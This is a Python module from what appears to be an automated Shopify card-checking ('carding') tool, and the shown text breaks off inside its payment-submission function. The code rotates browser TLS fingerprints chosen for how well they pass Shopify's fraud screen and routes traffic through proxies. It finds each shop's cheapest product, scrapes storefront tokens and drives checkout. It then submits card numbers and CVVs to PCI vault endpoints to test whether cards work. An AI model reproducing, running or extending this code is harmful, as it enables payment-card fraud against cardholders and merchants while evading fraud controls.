from __future__ import annotations

import asyncio
import json
import re
import html
import random
import urllib.parse
import time as _time

from curl_cffi.requests import AsyncSession

import importlib.util
from pathlib import Path

from telemetry_v2 import Tracker
from run_logger import RunLogger, LoggedClient

_here = Path(__file__).resolve().parent
_auto_path = _here / "auto.py"
if not _auto_path.is_file():
    _auto_path = _here.parent / "auto.py"
_spec = importlib.util.spec_from_file_location("shopify_auto", _auto_path)
_auto = importlib.util.module_from_spec(_spec)
assert _spec.loader is not None
_spec.loader.exec_module(_auto)

CheckStatus = _auto.CheckStatus
CheckResult = _auto.CheckResult
Address = _auto.Address
BROWSER_PROFILES = _auto.BROWSER_PROFILES
USER_AGENTS = _auto.USER_AGENTS
PROFILE_UA = _auto.PROFILE_UA
ACCEPT_LANGUAGE_VARIANTS = _auto.ACCEPT_LANGUAGE_VARIANTS
ACCEPT_VARIANTS = _auto.ACCEPT_VARIANTS
browser_extra_headers = _auto.browser_extra_headers
random_extra_fp = _auto.random_extra_fp
USE_EXTRA_FP = _auto.USE_EXTRA_FP
generate_random_email = _auto.generate_random_email
address_for_country = _auto.address_for_country
parse_card_entry = _auto.parse_card_entry
normalize_proxy = _auto.normalize_proxy
extract_stable_id = _auto.extract_stable_id
extract_commit_sha = _auto.extract_commit_sha
extract_source_token = _auto.extract_source_token
extract_private_access_token_id = _auto.extract_private_access_token_id
extract_actions_js_url = _auto.extract_actions_js_url
extract_proposal_id = _auto.extract_proposal_id
extract_submit_for_completion_id = _auto.extract_submit_for_completion_id
extract_queue_token = _auto.extract_queue_token
extract_seller_currency = _auto.extract_seller_currency
extract_seller_country = _auto.extract_seller_country
extract_seller_merchandise_price = _auto.extract_seller_merchandise_price
extract_is_shipping_required = _auto.extract_is_shipping_required
extract_delivery_handle = _auto.extract_delivery_handle
extract_signed_handles = _auto.extract_signed_handles
extract_shipping_amount = _auto.extract_shipping_amount
extract_checkout_total = _auto.extract_checkout_total
extract_seller_total = _auto.extract_seller_total
extract_running_total = _auto.extract_running_total
extract_tax_amount = _auto.extract_tax_amount
extract_identification_signature = _auto.extract_identification_signature
extract_pci_session_id = _auto.extract_pci_session_id
PCI_ENDPOINTS = _auto.PCI_ENDPOINTS
extract_vault_domain = _auto.extract_vault_domain
extract_vault_url = _auto.extract_vault_url
_VAULT_CACHE = _auto._VAULT_CACHE
extract_receipt_id = _auto.extract_receipt_id
extract_poll_for_receipt_id = _auto.extract_poll_for_receipt_id
extract_js_refs = _auto.extract_js_refs
extract_persisted_ids = _auto.extract_persisted_ids
merge_persisted_ids = _auto.merge_persisted_ids
_OPERATION_NAMES = _auto._OPERATION_NAMES
extract_receipt_session_token = _auto.extract_receipt_session_token
extract_receipt_status_code = _auto.extract_receipt_status_code
extract_any_error = _auto.extract_any_error
normalize_card_result = _auto.normalize_card_result
result_status_for = _auto.result_status_for
classify_receipt = _auto.classify_receipt
no_code_failure = _auto.no_code_failure
submit_body_reports_success = _auto.submit_body_reports_success
classify_pci_rejection = _auto.classify_pci_rejection
_pci_error_reason = _auto._pci_error_reason
extract_tax_from_rejected = _auto.extract_tax_from_rejected
extract_total_from_rejected = _auto.extract_total_from_rejected
extract_rejected_totals = _auto.extract_rejected_totals
extract_pending_poll_delay = _auto.extract_pending_poll_delay
CURRENCY_TO_COUNTRY = _auto.CURRENCY_TO_COUNTRY
_RE_CURRENCY_CART = _auto._RE_CURRENCY_CART
extract_gateway_name = _auto.extract_gateway_name
extract_delivery_from_proposal = _auto.extract_delivery_from_proposal
resolve_delivery = _auto.resolve_delivery
extract_payment_flexibility_terms_id = _auto.extract_payment_flexibility_terms_id
_proposal_headers = _auto._proposal_headers
patch_payload = _auto.patch_payload
check_submit_errors = _auto.check_submit_errors
generate_attempt_token = _auto.generate_attempt_token
generate_page_id = _auto.generate_page_id

# ── Async TLS client ──────────────────────────────────────────────────

# Weighted profile selection — older, more-accurately-impersonated profiles pass
# Shopify's fraud screen more often (measured from 528 session logs: safari17_0
# 14.9%, chrome123 13.0% real vs firefox135 0.0%). Weights are proportional to
# observed real-response rate; the worst performers are excluded entirely.
_PROFILE_WEIGHTS = {
    # proven (from session-log pass rates)
    "safari17_0": 15,
    "chrome123":  13,
    "chrome120":   9,
    "safari184":   9,
    "chrome119":   6,
    "chrome124":   5,
    "chrome116":   5,
    # new curl_cffi 0.16 profiles (low weight until proven)
    "chrome131":   3,
    "chrome133a":  2,
    "chrome136":   2,
    "chrome150":   2,
    "firefox147":  1,
    "firefox144":  1,
    "safari260":   1,
    "safari2601":  1,
}


def _weighted_profile() -> str:
    profiles = list(_PROFILE_WEIGHTS)
    weights = [_PROFILE_WEIGHTS[p] for p in profiles]
    return random.choices(profiles, weights=weights, k=1)[0]


class AsyncTLSClient:
    def __init__(self, timeout=20, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout     = timeout
        self.proxy_url   = proxy_url
        self.impersonate = impersonate
        if self.impersonate is None:
            self.impersonate = _weighted_profile()
        self.user_agent  = user_agent or PROFILE_UA.get(self.impersonate) or random.choice(USER_AGENTS)
        self._lang  = "en-US,en;q=0.9"
        self._session: AsyncSession | None = None

    def _make_session(self) -> AsyncSession:
        headers = {
            'User-Agent':                self.user_agent,
            'Accept-Language':           random.choice(ACCEPT_LANGUAGE_VARIANTS),
            'Accept-Encoding':           'gzip, deflate, br',
            'Accept':                    random.choice(ACCEPT_VARIANTS),
            'Connection':                'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':            'document',
            'Sec-Fetch-Mode':            'navigate',
            'Sec-Fetch-Site':            'none',
            'Sec-Fetch-User':            '?1',
            'Cache-Control':             'max-age=0',
        }
        # browser-specific headers (Chrome client hints) for fingerprint variation
        headers.update(browser_extra_headers(self.impersonate))
        kwargs = {"impersonate": self.impersonate, "timeout": self.timeout}
        if USE_EXTRA_FP:
            try:
                kwargs["extra_fp"] = random_extra_fp()
            except Exception:
                pass
        s = AsyncSession(**kwargs)
        s.headers.update(headers)
        if self.proxy_url:
            s.proxies = {'http': self.proxy_url, 'https': self.proxy_url}
        return s

    async def __aenter__(self):
        self._session = self._make_session()
        return self

    async def __aexit__(self, *args):
        await self.close()

    async def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.get(url, **kwargs)

    async def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self._session is None:
            self._session = self._make_session()
        return await self._session.post(url, data=data, json=json, **kwargs)

    async def close(self):
        if self._session is not None:
            await self._session.close()
            self._session = None


# ── Step 0: cheapest product ──────────────────────────────────────────
# Catalog cache: shop/domain -> (cheapest_product_tuple, timestamp).
# Once populated, repeated requests for the same shop reuse this result
# instead of re-scanning /products.json until the TTL expires.
_product_cache: dict = {}
_product_cache_lock = __import__("threading").Lock()
_CACHE_TTL = 1800                          # 30 min catalog cache

# Negative / rate-limit cache: shop/domain -> (cooldown_until_ts, retry_after)
_catalog_rate_limit: dict = {}
# Per-shop single-flight: shop/domain -> asyncio.Future (result or (ok, value))
_catalog_scans: dict = {}
_catalog_scan_lock = __import__("threading").Lock()

# Configurable catalog-fetching knobs
_CATALOG_MAX_PAGES = 50                    # hard cap on scanned pages
_CATALOG_BATCH = 3                         # concurrent pages per pacing wave
_CATALOG_MAX_RETRIES = 2                   # 429 retries per catalog page
_CATALOG_MAX_BACKOFF = 8.0                 # s, cap for exponential backoff
_CATALOG_JITTER = 0.4                      # ±40% jitter on delays
_CATALOG_RATELIMIT_COOLDOWN = 60           # s, temporary per-shop cooldown
_CATALOG_WARMUP = True                     # homepage warm-up before scanning
_CATALOG_DIRECT_FALLBACK = True            # proxy-429/blocked -> direct public catalog read
_MIN_CHECKOUT_AMOUNT = 0.50                # skip prices below this (avoid TOO_LOW_AMOUNT)
_CATALOG_GRAPHQL_FALLBACK = True           # storefront GraphQL as a fallback
_CATALOG_GRAPHQL_FIRST = False             # direct first (fast/reliable), GraphQL when /products.json is throttled
_CATALOG_GRAPHQL_VERSION = "2024-07"
_CATALOG_GRAPHQL_PAGE = 250
_CATALOG_GRAPHQL_TIMEOUT = 5                # s, per GraphQL request (fail fast)
_CATALOG_GRAPHQL_BLOCK_TTL = 600            # s, skip GraphQL after "unavailable"
_GRAPHQL_TOKENS = ("public_storefront", "public", "")
_graphql_token_cache: dict = {}            # shop_url -> discovered token
_graphql_blocked: dict = {}                # shop_url -> blocked_until_ts

# Persistent proxy-less client used ONLY for public /products.json reads
# (a fallback when the caller's proxy is exhausted; checkout still uses the proxy)
_catalog_direct_client: "AsyncTLSClient | None" = None


class _CatalogRateLimited(Exception):
    """Raised when the catalog stays rate-limited after exhausting retries."""
    def __init__(self, shop_url, retry_after=None):
        self.shop_url = shop_url
        self.retry_after = retry_after
        super().__init__(f"catalog rate limited (HTTP 429): {shop_url}")


def calculate_backoff(attempt: int, retry_after: str | float | None = None) -> float:
    """Return a delay (s) for 429 handling.
    Honors Retry-After when Shopify provides it, otherwise uses exponential
    backoff with random jitter, capped at a maximum delay to prevent storms.
    """
    delay = min(1.0 * (2.0 ** attempt), _CATALOG_MAX_BACKOFF)
    if retry_after is not None:
        try:
            delay = float(retry_after)
            if delay > 0:
                delay = min(delay, 120.0)   # never wait absurdly long
        except (TypeError, ValueError):
            pass
    if delay <= 0:
        delay = 0.5
    return max(0.2, delay * random.uniform(1 - _CATALOG_JITTER, 1 + _CATALOG_JITTER))


async def warm_up_catalog_session(client: AsyncTLSClient, shop_url: str):
    """Lightweight warm-up: hits the storefront homepage with the same TLS
    browser session used for the catalog scan so the session is initialized
    and cookies are set before /products.json is requested."""
    if not _CATALOG_WARMUP:
        return
    try:
        await client.get(f"{shop_url}/", timeout=10)
    except Exception:
        pass


def _no_products_error(shop_url: str, min_price: float, max_price: float) -> Exception:
    if max_price == float('inf'):
        return Exception(f"No available products at {shop_url}")
    return Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")


async def _fetch_catalog_page(client: AsyncTLSClient, shop_url: str, page: int, limit: int):
    """Fetch one /products.json page with 429 retry/backoff on the same session.
    Returns (status, products). status 429 means the retry budget was exhausted.
    """
    url = f"{shop_url}/products.json?limit={limit}&page={page}"
    status = None
    for attempt in range(_CATALOG_MAX_RETRIES + 1):
        try:
            resp = await client.get(url, timeout=15)
            status = resp.status_code
        except Exception:
            if attempt < _CATALOG_MAX_RETRIES:
                await asyncio.sleep(calculate_backoff(attempt, None))
                continue
            return None, None                  # transport error, retry budget exhausted
        if status == 429:
            try:
                retry_after = resp.headers.get("Retry-After")
            except Exception:
                retry_after = None
            delay = calculate_backoff(attempt, retry_after)
            await asyncio.sleep(delay)
            continue
        if status != 200:
            return status, None
        try:
            return 200, resp.json().get("products", [])
        except Exception:
            return 200, None
    return 429, None


def _get_catalog_direct_client() -> "AsyncTLSClient":
    """Lazily build one persistent no-proxy client reused for catalog reads."""
    global _catalog_direct_client
    with _catalog_scan_lock:
        if _catalog_direct_client is None:
            _catalog_direct_client = AsyncTLSClient(timeout=15, proxy_url=None,
                                                    impersonate=None, user_agent=None)
        return _catalog_direct_client


def _catalog_pick(products, best_price, best_product, min_price, max_price):
    """Existing cheapest-product filtering and selection (unchanged), except
    candidates below _MIN_CHECKOUT_AMOUNT are skipped so the store does not
    reject the amount with TOO_LOW_AMOUNT."""
    lower = max(min_price, _MIN_CHECKOUT_AMOUNT)
    for p in products or []:
        for v in p.get("variants", []):
            if not v.get("available", False):
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < lower or price > max_price:
                continue
            if price < best_price:
                best_price = price
                best_product = (
                    p.get("title", ""),
                    str(p.get("id", "")),
                    p.get("handle", ""),
                    str(v.get("id", "")),
                    v.get("price", "")
                )
    return best_price, best_product


async def _scan_catalog_direct(shop_url: str, min_price: float, max_price: float, logger=None):
    """Proxy-less scan of the public /products.json used as a fallback when the
    proxied catalog is rate-limited/blocked. Reads public product data only;
    checkout still runs through the caller's proxy."""
    client = _get_catalog_direct_client()
    if logger is not None:
        client = LoggedClient(client, logger)
    limit = 250
    best_price = float('inf')
    best_product = None

    p1_status, page1 = await _fetch_catalog_page(client, shop_url, 1, limit)
    if p1_status == 429:
        raise _CatalogRateLimited(shop_url)
    if page1 is None:
        if p1_status == 200:
            page1 = []                       # decode failure -> treat as empty
        else:
            raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {p1_status})")

    best_price, best_product = _catalog_pick(page1, best_price, best_product, min_price, max_price)
    if len(page1) < limit or not page1:
        if best_product is None:
            raise _no_products_error(shop_url, min_price, max_price)
        return best_product

    next_page = 2
    total_pages = _CATALOG_MAX_PAGES
    while next_page <= total_pages:
        end = min(next_page + _CATALOG_BATCH - 1, total_pages)
        await asyncio.sleep(random.uniform(0.05, 0.3))
        batch = await asyncio.gather(*[_fetch_catalog_page(client, shop_url, p, limit)
                                       for p in range(next_page, end + 1)])
        rate_limited = False
        for p, (st, products) in zip(range(next_page, end + 1), batch):
            if st == 429:
                rate_limited = True
                continue
            if products is None:
                continue
            best_price, best_product = _catalog_pick(products, best_price, best_product, min_price, max_price)
            if len(products) < limit or not products:
                if best_product is None:
                    raise _no_products_error(shop_url, min_price, max_price)
                return best_product
        if rate_limited:
            if best_product is None:
                raise _CatalogRateLimited(shop_url)
            return best_product
        next_page = end + 1

    if best_product is None:
        raise _no_products_error(shop_url, min_price, max_price)
    return best_product


# ── Storefront GraphQL fallback ────────────────────────────────────────

_GRAPHQL_PRODUCTS_QUERY = """query ($cursor: String, $count: Int!) {
  products(first: $count, after: $cursor) {
    pageInfo { hasNextPage endCursor }
    edges { node {
      id title handle
      variants(first: 100) {
        pageInfo { hasNextPage }
        edges { node { id availableForSale price { amount currencyCode } } }
      }
    } }
  }
}"""


def _gid_numeric(gid):
    """Extract the numeric id from a Shopify gid:// node ID."""
    if not gid:
        return ""
    try:
        return str(gid).rsplit("/", 1)[-1]
    except Exception:
        return ""


def _graphql_edges_to_products(data):
    """Convert a Storefront GraphQL products response to the same product-dict
    structure used by /products.json so _catalog_pick can consume it unchanged."""
    products = []
    for e in ((data.get("data") or {}).get("products") or {}).get("edges") or []:
        n = e.get("node") or {}
        variants = []
        for ve in (n.get("variants") or {}).get("edges") or []:
            vn = ve.get("node") or {}
            variants.append({
                "id":       _gid_numeric(vn.get("id")),
                "price":    str(((vn.get("price") or {}).get("amount")) or "0"),
                "available": bool(vn.get("availableForSale")),
            })
        products.append({
            "title":    n.get("title", ""),
            "id":       _gid_numeric(n.get("id")),
            "handle":   n.get("handle", ""),
            "variants": variants,
        })
    return products


async def _discover_storefront_token(client: AsyncTLSClient, shop_url: str):
    """Try to extract the storefront GraphQL access token embedded in the
    storefront HTML (headless/Hydrogen themes publish it). Returns None when
    the store does not expose one."""
    try:
        resp = await client.get(f"{shop_url}/", timeout=15)
        if resp.status_code != 200:
            return None
        html = resp.text or ""
    except Exception:
        return None
    for pat in (r"storefrontAccessToken[^A-Za-z0-9]*['\"]([A-Za-z0-9]+)",
                r"X-Shopify-Storefront-Access-Token[^A-Za-z0-9]*['\"]([A-Za-z0-9]+)",
                r"['\"]accessToken['\"]\s*:\s*['\"]([A-Za-z0-9]{10,})"):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


async def _storefront_products(client: AsyncTLSClient, shop_url: str, max_pages: int):
    """Paginate the storefront GraphQL catalog, trying known tokens and
    reusing any previously discovered valid token. Returns all products as
    the pseudo product-dict list that _catalog_pick expects."""
    base_url = f"{shop_url}/api/{_CATALOG_GRAPHQL_VERSION}/graphql.json"
    token = _graphql_token_cache.get(shop_url)
    all_products: list[dict] = []
    cursor = None

    for page_num in range(1, max_pages + 1):
        payload = {"query": _GRAPHQL_PRODUCTS_QUERY,
                   "variables": {"count": _CATALOG_GRAPHQL_PAGE, "cursor": cursor}}

        ok = False
        tokens_to_try = []
        if token:
            tokens_to_try.append(token)
        if not tokens_to_try:
            found = await _discover_storefront_token(client, shop_url)
            if found:
                tokens_to_try.append(found)
        for t in _GRAPHQL_TOKENS:
            if t and t not in tokens_to_try:
                tokens_to_try.append(t)
        for t in tokens_to_try:
            if not t:
                continue
            try:
                resp = await client.post(base_url, json=payload,
                                         headers={"Content-Type": "application/json",
                                                   "X-Shopify-Storefront-Access-Token": t,
                                                   "Accept": "application/json"},
                                         timeout=_CATALOG_GRAPHQL_TIMEOUT)
            except Exception:
                continue
            if resp.status_code == 404:
                _graphql_blocked[shop_url] = _time.time() + _CATALOG_GRAPHQL_BLOCK_TTL
                raise Exception(f"storefront graphql unavailable for {shop_url}")
            if resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except Exception:
                continue
            errors = (data.get("errors") or [])
            if any("access token" in (e.get("message", "")).lower() for e in errors):
                continue
            ok = True
            token = t                       # cache the working token
            _graphql_token_cache[shop_url] = t
            break
        if not ok:
            _graphql_blocked[shop_url] = _time.time() + _CATALOG_GRAPHQL_BLOCK_TTL
            raise Exception(f"storefront graphql unavailable for {shop_url}")

        page_products = _graphql_edges_to_products(data)
        if page_products:
            all_products += page_products

        page_info = (((data.get("data") or {}).get("products") or {}).get("pageInfo") or {})
        if not page_info.get("hasNextPage"):
            break
        cursor = page_info.get("endCursor")
        await asyncio.sleep(random.uniform(0.05, 0.2))

    return all_products


async def _scan_catalog_graphql(shop_url: str, min_price: float, max_price: float, logger=None):
    """Storefront GraphQL catalog scan (no /products.json, no 429 on that path).
    Returns the cheapest available product using the same _catalog_pick logic."""
    client = _get_catalog_direct_client()
    if logger is not None:
        client = LoggedClient(client, logger)
    all_products = await _storefront_products(client, shop_url, _CATALOG_MAX_PAGES)

    best_price = float('inf')
    best_product = None
    best_price, best_product = _catalog_pick(all_products, best_price, best_product, min_price, max_price)
    if best_product is None:
        raise _no_products_error(shop_url, min_price, max_price)
    return best_product


async def _scan_catalog(client: AsyncTLSClient, shop_url: str,
                        min_price: float, max_price: float, logger=None):
    """Full catalog scan: warms the session, fetches page 1 first, then walks
    the remaining pages in small paced batches on the same session. Stops on
    the last (short/empty) page, the page cap, or persistent 429. When the
    caller's proxy itself is rate-limited/blocked, falls back first to the
    storefront GraphQL catalog, then to a direct public products.json read
    (checkout still uses the proxy)."""
    await warm_up_catalog_session(client, shop_url)

    async def _try_fallback():
        if not _CATALOG_DIRECT_FALLBACK:
            raise _CatalogRateLimited(shop_url)

        graphql_ok = (_CATALOG_GRAPHQL_FALLBACK
                      and _graphql_blocked.get(shop_url, 0) < _time.time())

        if _CATALOG_GRAPHQL_FIRST and graphql_ok:
            try:
                return await _scan_catalog_graphql(shop_url, min_price, max_price, logger=logger)
            except Exception:
                pass          # GraphQL is only an optional probe; never block here

        try:
            return await _scan_catalog_direct(shop_url, min_price, max_price, logger=logger)
        except _CatalogRateLimited as e:
            # /products.json is genuinely throttled: GraphQL (separate endpoint)
            # may still answer, before giving up.
            if graphql_ok:
                try:
                    return await _scan_catalog_graphql(shop_url, min_price, max_price, logger=logger)
                except Exception:
                    pass
            raise e

    limit = 250
    best_price = float('inf')
    best_product = None

    # Page 1 always fetched first (and alone).
    p1_status, page1 = await _fetch_catalog_page(client, shop_url, 1, limit)
    if p1_status == 429:
        return await _try_fallback()
    if page1 is None:
        if p1_status == 200:
            page1 = []                       # decode failure -> treat as empty
        else:
            if _CATALOG_DIRECT_FALLBACK:
                return await _try_fallback()
            raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {p1_status})")

    best_price, best_product = _catalog_pick(page1, best_price, best_product, min_price, max_price)

    # Single-page catalog (or page 1 was the last page): done.
    if len(page1) < limit or not page1:
        if best_product is None:
            raise _no_products_error(shop_url, min_price, max_price)
        return best_product

    # Multiple pages: walk in small paced batches; no /products/count.json.
    next_page = 2
    total_pages = _CATALOG_MAX_PAGES
    while next_page <= total_pages:
        end = min(next_page + _CATALOG_BATCH - 1, total_pages)
        await asyncio.sleep(random.uniform(0.1, 0.5))   # pacing/jitter between batches
        batch = await asyncio.gather(*[_fetch_catalog_page(client, shop_url, p, limit)
                                       for p in range(next_page, end + 1)])
        rate_limited = False
        any_success = False
        for p, (st, products) in zip(range(next_page, end + 1), batch):
            if st == 429:
                rate_limited = True
                continue
            if products is None:
                continue
            any_success = True
            best_price, best_product = _catalog_pick(products, best_price, best_product, min_price, max_price)
            if len(products) < limit or not products:
                # Reached the real last catalog page.
                if best_product is None:
                    raise _no_products_error(shop_url, min_price, max_price)
                return best_product
        if rate_limited:
            # Persistent 429 within the batch: stop requesting more pages.
            if best_product is None:
                return await _try_fallback()
            return best_product
        if not any_success:
            # Entire batch failed (network/non-200): stop pagination.
            if best_product is None and _CATALOG_DIRECT_FALLBACK:
                return await _try_fallback()
            break
        next_page = end + 1

    if best_product is None:
        raise _no_products_error(shop_url, min_price, max_price)
    return best_product


async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
                                min_price: float = 0.01, max_price: float | None = None,
                                logger=None):
    """Cheapest available product, backed by a per-shop catalog cache,
    single-flight scanning, warmed session reuse, pacing and 429 backoff."""
    if max_price is None:
        max_price = float('inf')

    now = _time.time()
    with _product_cache_lock:
        cached = _product_cache.get(shop_url)
        if cached and now - cached[-1] < _CACHE_TTL:
            return cached[:-1]
        rl = _catalog_rate_limit.get(shop_url)
        if rl and now < rl[0]:
            if cached:                       # serve known-best during cooldown
                return cached[:-1]
            raise Exception(f"No available products at {shop_url} (catalog temporarily unavailable)")

    # Per-shop single-flight: only one catalog scan per shop at a time.
    joining = False
    with _catalog_scan_lock:
        fut = _catalog_scans.get(shop_url)
        if fut is not None and not fut.done():
            joining = True
        else:
            fut = asyncio.get_running_loop().create_future()
            _catalog_scans[shop_url] = fut
    if joining:
        ok, val = await asyncio.shield(fut)
        if ok:
            return val
        raise val

    try:
        try:
            result = await _scan_catalog(client, shop_url, min_price, max_price, logger=logger)
        except _CatalogRateLimited as e:
            cooldown = _CATALOG_RATELIMIT_COOLDOWN
            if e.retry_after:
                try:
                    cooldown = max(cooldown, float(e.retry_after))
                except (TypeError, ValueError):
                    pass
            with _product_cache_lock:
                _catalog_rate_limit[shop_url] = (_time.time() + cooldown, e.retry_after)
                cached = _product_cache.get(shop_url)
            if cached:
                result = cached[:-1]         # reuse known result during cooldown
            else:
                err = Exception(f"No available products at {shop_url} (catalog temporarily unavailable)")
                fut.set_result((False, err))
                raise err
        else:
            with _product_cache_lock:
                _product_cache[shop_url] = result + (_time.time(),)
        fut.set_result((True, result))
        return result
    except asyncio.CancelledError:
        if not fut.done():
            fut.set_result((False, asyncio.CancelledError("catalog scan cancelled")))
        raise
    except Exception as e:
        if not fut.done():
            fut.set_result((False, e))
        raise
    finally:
        with _catalog_scan_lock:
            if _catalog_scans.get(shop_url) is fut:
                _catalog_scans.pop(shop_url, None)


# ── Currency detection (mirrors app.go fetchCurrency) ────────────────

async def fetch_shop_currency(client: AsyncTLSClient, shop_url: str) -> tuple:
    """
    Detect shop currency and resolve its country code.
    Tries /meta.json → /cart.js → fallback "USD"/"US".
    """
    def _apply(cur):
        return cur, CURRENCY_TO_COUNTRY.get(cur, "US")

    for path in ("/meta.json", "/cart.js"):
        try:
            resp = await client.get(f"{shop_url}{path}", timeout=10)
            if resp and resp.status_code == 200:
                if path == "/meta.json":
                    try:
                        cur = str((resp.json().get("currency") or "")).strip().upper()
                    except Exception:
                        cur = ""
                else:
                    m = _RE_CURRENCY_CART.search(resp.text)
                    cur = m.group(1).upper() if m else ""
                if len(cur) == 3:
                    return _apply(cur)
        except Exception:
            continue
    return "USD", "US"


# ── Step 1: cart → checkout ───────────────────────────────────────────

_PAGE_HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
    "cache-control": "no-cache",
    "pragma": "no-cache",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1",
}


async def add_to_cart_and_checkout(client: AsyncTLSClient, shop_url: str,
                                   variant_id: str, product_id: str, product_handle: str):
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = await client.get(cart_permalink, allow_redirects=True, headers={
        **_PAGE_HEADERS,
        "user-agent": client.user_agent,
        "referer":    shop_url + "/",
        "sec-fetch-site": "same-origin",
    })
    checkout_url  = checkout_resp.url
    checkout_html = checkout_resp.text

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"',
                               checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""
    return checkout_url, checkout_token, session_token, checkout_html


# ── Step 2: private access token ─────────────────────────────────────

async def fetch_private_access_token(client: AsyncTLSClient, shop_url: str,
                                     checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = await client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"


# ── Step 3: actions JS ────────────────────────────────────────────────

async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: str) -> str:
    """Fetch every modulepreload chunk (newline-joined urls) and return their
    concatenated JS bodies so the persisted-query registry can be extracted."""
    urls = [u for u in actions_url.split("\n") if u.strip()]
    if not urls:
        return ""
    bodies = [""] * len(urls)
    headers = {"accept": "*/*", "accept-language": "en-US,en;q=0.9", "sec-fetch-dest": "script",
               "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin"}

    async def one(idx, u):
        try:
            r = await client.get(u, headers=headers)
            if r.status_code == 200:
                bodies[idx] = r.text
        except Exception:
            pass

    await asyncio.gather(*[one(i, u) for i, u in enumerate(urls)])
    return "\n".join(b for b in bodies if b)


# ── Persisted-query id discovery (async sweep + buildId cache) ────────
# Resolves Proposal/SubmitForCompletion/PollForReceipt ids by scanning the
# checkout page's JS bundles by *content* (filename- and order-independent).
# The ids belong to the checkout build, not the shop, so the cache keys on
# buildId and one sweep serves every shop on that build for 1h.

_OP_CACHE_TTL = 3600       # 1h; ids only change when the checkout build changes
_OP_SWEEP_CONCURRENCY = 12
_op_id_cache: dict = {}
_op_id_lock = __import__("threading").Lock()


async def _fetch_bundle_ids(client: AsyncTLSClient, url: str) -> dict:
    try:
        resp = await client.get(url, timeout=30)
        if resp.status_code != 200:
            return {}
        return extract_persisted_ids(resp.text or "")
    except Exception:
        return {}


async def discover_persisted_ids(client: AsyncTLSClient, checkout_html: str,
                                 shop_url: str, build_id: str = "",
                                 required=None) -> dict:
    """Resolve operation name -> persisted-query id by scanning checkout bundles.

    Tier 1: our importmap+modulepreload hint (fast path — the registry chunks).
    Tier 2: every checkout-web bundle referenced by the page, fetched
            concurrently and matched on content, short-circuiting when complete.
    """
    required = tuple(required or _OPERATION_NAMES)
    key = f"build:{build_id}" if build_id else f"shop:{shop_url}"

    with _op_id_lock:
        hit = _op_id_cache.get(key)
        if hit and (_time.time() - hit[1]) < _OP_CACHE_TTL:
            cached = hit[0]
            if all(cached.get(n) for n in required):
                return {n: cached[n] for n in required}

    found: dict = {}

    hint_urls = [x for x in (extract_actions_js_url(checkout_html, shop_url) or "").split("\n")
                 if x.strip()]
    for u in hint_urls:
        merge_persisted_ids(found, await _fetch_bundle_ids(client, u))
        if all(found.get(n) for n in required):
            with _op_id_lock:
                _op_id_cache[key] = (dict(found), _time.time())
            return {n: found[n] for n in required}

    refs = [u for u in extract_js_refs(checkout_html, shop_url) if u not in hint_urls]
    sem = asyncio.Semaphore(_OP_SWEEP_CONCURRENCY)

    async def one(url: str) -> dict:
        async with sem:
            return await _fetch_bundle_ids(client, url)

    wave = _OP_SWEEP_CONCURRENCY * 4
    for start in range(0, len(refs), wave):
        chunk = refs[start:start + wave]
        for ids in await asyncio.gather(*[one(u) for u in chunk]):
            if ids:
                merge_persisted_ids(found, ids)
        if all(found.get(n) for n in required):
            break

    if all(found.get(n) for n in required):
        with _op_id_lock:
            _op_id_cache[key] = (dict(found), _time.time())
    return {n: found.get(n, "") for n in required}


# ── Step 9: PCI session ───────────────────────────────────────────────

async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                           card_month: int, card_year: int, cvv: str,
                           shop_domain: str, proxy_url: str = "", impersonate: str = "chrome150",
                           logger=None, vault_url: str = "", vault_domain: str = ""):
    # PCI vault scope — prefer the real hostedFieldsUrl domain extracted from the
    # checkout HTML, fall back to the shop hostname (matches main(6).py).
    scope = ((vault_domain or "").strip()
             or (shop_domain or "").replace("https://", "").replace("http://", "").split("/")[0])

    payload = json.dumps({
        "credit_card": {
            "number":             card_number,
            "month":              card_month,
            "year":               card_year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": scope,
    })

    # Endpoint candidates: page-embedded vault URL + cached + known PCI endpoints.
    candidates = []
    if vault_url and vault_url not in candidates:
        candidates.append(vault_url)
    cached = _VAULT_CACHE.get(scope)
    if cached and cached not in candidates:
        candidates.insert(0, cached)
    for ep in PCI_ENDPOINTS:
        if ep not in candidates:
            candidates.append(ep)

    last_status, last_body = 0, ""
    async with AsyncSession(impersonate=impersonate) as session:
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}

        for ep in candidates:
